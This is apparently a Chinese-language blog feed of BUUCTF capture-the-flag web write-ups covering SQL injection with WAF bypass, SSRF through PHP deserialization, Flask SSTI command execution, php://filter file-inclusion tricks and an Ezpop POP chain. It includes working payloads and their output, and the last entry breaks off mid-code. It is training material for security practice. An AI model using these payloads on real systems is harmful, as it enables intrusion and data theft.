 f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="comment">#action默认参数为scan</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>第二个参数传入一个文件名<code>根据提示是flag.txt</code><br>第三个参数sign是一个md5值<br>最关键就是第三个参数，由于我们不知道secert_key的值，所以不能自己加密，考点应该在这里！</p><p>由于我们并没有secert_key的值，所以本来是没得办法的。</p><p>但是/geneSign路由，暴露了getSign函数，</p><p>我们可以根据路由getSign去得到正确的sign值。</p><p>访问一下geneSign传入参数param=flag.txtread得到一串MD5值：</p><p>f8c0d736fa2e823c2b488c82561c4732</p><p><code>然后让flag.txtread + scan拼接加密md5即为</code>sign</p><p>/Delta?param=flag.txt</p><p>Cookie:action=readscan;sign=f8c0d736fa2e823c2b488c82561c4732;</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%E7%BD%91%E9%BC%8E%E6%9D%AF%202018%5DFakebook/</url>
      
        <content type="html"><![CDATA[<h2 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h2><p>看到</p><p>/user.php.bak</p><p>下载后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>join，即注册一个用户</p><p>点击自己的username，点击之后，观察url可能存在get注入。是数字型注入。union select 发现有waf，用/<strong>/即可绕过。union /</strong>/ select.回显位置是第二位，往下注注注。</p><p>发现爆出路径：/var/www/html/</p><p>o:8:”UserInfo”:3:{s:4:”name”:1:”a”;s:3:”age”:i:1:0;s:4:”blog”;s:29:”file:///var/www/html/flag.php”;}</p><p>因为blog在第四位，所以paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no=-1/**/union/**/select/**/1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>注入后blog栏显示file:///var/www/html/flag.php，此时即代表注册成功。查看源码：</p><p>iframe标签中读取了flag.php中的内容。flag即出现</p><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>ssrf</li><li>sql注入</li><li>反序列化漏洞</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[GXYCTF2019]BabySQli</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%5BGXYCTF2019%5DBabySQli/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SQL%E6%B3%A8%E5%85%A5/%5BGXYCTF2019%5DBabySQli/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li><p>绕过密码的md5验证</p><p>MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5</p><p>base32  base64 解密</p><p>select * from user where username = ‘$name’</p></li></ul><p>直接可以用联合注入，表里有三列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; Order by 3#</span></span><br></pre></td></tr></table></figure><p>进行用联合注入，回显wrong user!，说明用户不在第一列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,3#</span></span><br></pre></td></tr></table></figure><p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,&#x27;</span>admin<span class="string">&#x27;,3#</span></span><br></pre></td></tr></table></figure><p>0’ union select 0,’admin’,’e10adc3949ba59abbe56e057f20f883e’#</p><p>密码输入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure><p>flag{bbdf4c9d-3ae8-42a4-9f0f-b1ebd92537ae}</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Flask]SSTI</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSTI/%5BFlask%5DSSTI/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/SSTI/%5BFlask%5DSSTI/</url>
      
        <content type="html"><![CDATA[<p>[Flask]SSTI</p><p>payload</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello HOSTNAME=d43aec63194a PYTHON_PIP_VERSION=19.3.1 HOME=/root GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D PYTHON_GET_PIP_URL=<a href="https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py">https://github.com/pypa/get-pip/raw/ffe826207a010164265d9cc807978e3604d18ca0/get-pip.py</a> SERVER_SOFTWARE=gunicorn/20.0.0 PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.6.9 PWD=/app PYTHON_GET_PIP_SHA256=b86f36cc4345ae87bfd4f10ef6b2dbfa7a872fbff70608a1e43944d283fd0eee FLAG=flag{044b09a2-bb0b-4dcb-abac-f4ceb70ff40e} }</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BSidesCF 2020]Had a bad day</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BBSidesCF%202020%5DHad%20a%20bad%20day/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BBSidesCF%202020%5DHad%20a%20bad%20day/</url>
      
        <content type="html"><![CDATA[<h1 id><a href="#" class="headerlink" title></a></h1><p>观察URL 修改category值看到报错 include</p><p>文件包含漏洞</p><p>?category=php://filter/convert.base64-encode/resource=index</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>需要对伪协议进行嵌套，加入一个可以通过的关键词然后进行flag读取</p><p>?category=php://filter/convert.base64-encode/resource=woofers/../flag</p><p>或</p><p>?category=php://filter/convert.base64-encode/index/resource=flag</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[MRCTF2020]Ezpop</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BMRCTF2020%5DEzpop/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5BMRCTF2020%5DEzpop/</url>
      
        <content type="html"><![CDATA[<p>__construct()//当一个对象创建时被调用</p><p>__destruct() //当一个对象销毁时被调用</p><p>__toString() //当一个对象被当作一个字符串使用</p><p>__sleep()//在对象在被序列化之前运行</p><p>__wakeup()//将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p><p>__get()//获得一个类的成员变量时调用</p><p>__set()//设置一个类的成员变量时调用</p><p>__invoke()//调用函数的方式调用一个对象时的回应方法</p><p>__call()//当调用一个对象中的不能用的方法的时候就会执行这个函数</p><p>此处用到的主要是__toString()，__wakeup()，__get()，__invoke()，</p><p>2.</p><p>类中，private变量与protected变量序列化后，变量名会有些异常，</p><p>private变量经反序列化后为\x00 + 类名 + \x00 + 变量名；</p><p>protected变量经反序列化后为，\x00 + * + \x00 + 变量名；</p><p>3.</p><p>列化操作只是保存对象(不是类)的变量，不保存对象的方法，其实反序列化的主要危害在于我们可以控制对象的变量来改变程序执行流程从而达到我们最终的目的。我们无法控制对象的方法来调用，因此我们这里只能去找一些可以自动调用的一些魔术方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$a</span>-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到序列化</p><p>O:4:”Show”:2:{s:6:”source”;O:4:”Show”:2:{s:6:”source”;N;s:3:”str”;O:4:”Test”:1:{s:1:”p”;O:8:”Modifier”:1:{s:6:”*var”;s:52:”php://filter/convert.base64-encode/resource=flag.php”;}}}s:3:”str”;N;}</p><p>进行urlencode</p><p>O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D</p><p>得到base64</p><p>PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFnezQ3MWE5ZmQ0LWUzZGYtNDRiNi04ZDhjLTU4Mjc0MGU4M2ZmYn0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$flag</span>= <span class="string">&quot;flag&#123;471a9fd4-e3df-44b6-8d8c-582740e83ffb&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Help Me Find FLAG!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> wp </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[安洵杯 2019]easy_web</title>
      <link href="/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_web/"/>
      <url>/2021/06/18/web%E5%AE%89%E5%85%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/php/%5B%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%5Deasy_web/</url>
      
        <content type="html"><![CDATA[<h1 id="未完成"><a href="#未完成" class="headerlink" title="未完成"></a>未完成</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 